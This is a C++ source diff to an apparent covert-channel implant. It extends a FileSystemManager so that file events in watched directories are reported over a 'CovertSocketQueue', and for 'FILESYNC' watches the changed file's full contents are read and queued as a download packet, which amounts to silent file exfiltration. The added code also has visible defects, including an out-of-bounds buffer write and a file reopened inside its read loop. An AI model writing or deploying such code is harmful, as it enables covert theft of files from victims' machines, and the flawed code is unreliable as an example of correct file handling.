@@ -8,6 +8,7 @@
 #include <sys/select.h>
 #include <cstring>
 #include <zconf.h>
+#include <fstream>
 
 FileSystemManager::FileSystemManager(CovertSocketQueue *covertSocketQueue) {
     this->covertSocketQueue = covertSocketQueue;
@@ -110,7 +111,7 @@ void FileSystemManager::hangForEvents() {
     maxWaitTime.tv_sec = 10;
 
     Logger::debug("FileSystemManager:hangForEvents - Now Hanging");
-    resultCount = select(1, &rfds, NULL, NULL, &maxWaitTime); // at max this select will take 10 seconds before it returns
+    resultCount = select(this->inotifyFD + 1, &rfds, NULL, NULL, &maxWaitTime); // at max this select will take 10 seconds before it returns
 
     if(resultCount < 0){
         Logger::debug("FileSystemManager:hangForEvents - There Was An Error On Select. Could Not Process Any Events");
@@ -151,16 +152,70 @@ void FileSystemManager::hangForEvents() {
                     Logger::debug("FileSystemManger:hangForEvents - We Are Listening On A File. Not A Directory. Invalid Listener");
                 }else{
                     string directory = this->fileEventCommands.at(event->wd);
+                    string fileName = string(event->name);
                     Logger::debug("FileSystemManager:hangForEvents - Event Found From File: " + string(event->name)
                                   + " Of Directory: " + directory +". Full Path: " + directory + "/" + string(event->name));
 
-                    string fullPath = directory + "/" + string(event->name);
+                    string fullPath = directory + "/" + fileName;
 
-                    //read the file contents
+                    Logger::debug(fullPath);
 
-                    //create a packet with it
 
-                    //pass it to the CovertSocketQueue
+                    MessageType::MessageTypeEnum cmdType = this->eventTypeMap.at(event->wd);
+                    //determine command type. If FILE then just send a notification, if FILESYNC then read and process file
+
+                    if(cmdType == MessageType::FILE){
+
+                        string answer = "{HAAN";
+                        answer += (char)MessageType::FILEANSWER;
+                        answer += "0File Event Occurred In Directory: ";
+                        answer += fullPath;
+                        answer += "HAAN}";
+
+                        this->covertSocketQueue->addPacketToSend(answer);
+
+                    }else if(cmdType == MessageType::FILESYNC){
+
+                        string warning = "{HAAN";
+                        warning += (char)MessageType::FILEANSWER;
+                        warning += "1File Event Occurred For Sync File In Directory: ";
+                        warning += fullPath;
+                        warning += "HAAN}";
+
+                        this->covertSocketQueue->addPacketToSend(warning);
+
+                        int FILEBUFFERLEN = 1024;
+                        char FILEBUFFER[FILEBUFFERLEN];
+
+                        //read the file contents
+                        ifstream reader;
+                        string fileContents = "";
+
+                        while(reader.eof() == false){
+                            reader.open(fullPath.c_str(), ios::in | ios::binary);
+                            reader.read(FILEBUFFER, FILEBUFFERLEN);
+
+                            FILEBUFFER[FILEBUFFERLEN] = '\0';
+                            string strFileBuffer(FILEBUFFER);
+
+                            fileContents += strFileBuffer;
+                        }
+
+                        reader.close();
+                        //create a packet with it
+                        string answer = "{HAAN";
+                        answer += (char)MessageType::FILEDWNLD;
+                        answer += fileContents;
+                        answer += "HAAN}";
+
+                        //pass it to the CovertSocketQueue
+                        this->covertSocketQueue->addPacketToSend(answer);
+
+                    }else{
+                        Logger::debug("FileSystemManager:hangForEvents - No Defined Functionality For This Type Of Command. Can't Process File Event");
+                    }
+
+
 
 
                 }
